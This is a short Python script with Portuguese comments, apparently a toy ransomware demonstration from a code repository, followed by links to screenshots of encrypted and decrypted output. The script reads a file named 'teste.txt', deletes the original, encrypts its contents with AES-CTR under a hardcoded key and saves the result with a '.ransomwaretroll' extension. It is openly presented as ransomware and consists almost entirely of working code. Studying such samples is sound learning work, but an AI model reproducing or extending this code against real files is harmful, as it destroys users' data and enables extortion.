import os
import pyaes

## abrir o arquivo a ser criptografado
file_name = "teste.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## remover o arquivo
os.remove(file_name)

## chave de criptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

## criptografar o arquivo
crypto_data = aes.encrypt(file_data)

## salvar o arquivo criptografado
new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()

<img width="1440" alt="Captura de Tela 2025-06-13 às 23 12 28" src="https://github.com/user-attachments/assets/9a6807ae-10cd-413d-af2d-e2e589f775b3" />


<img width="1440" alt="encriptografado" src="https://github.com/user-attachments/assets/33ea48d2-edc0-45c1-afcd-9dde9e43ae31" />

<img width="1440" alt="Descriptografado" src="https://github.com/user-attachments/assets/b82dce09-e9e7-49c2-ba96-4115c6348ff7" />

<img width="1440" alt="arquivo aberto" src="https://github.com/user-attachments/assets/7b1c2a30-1f5c-4c15-8452-17db97739350" />

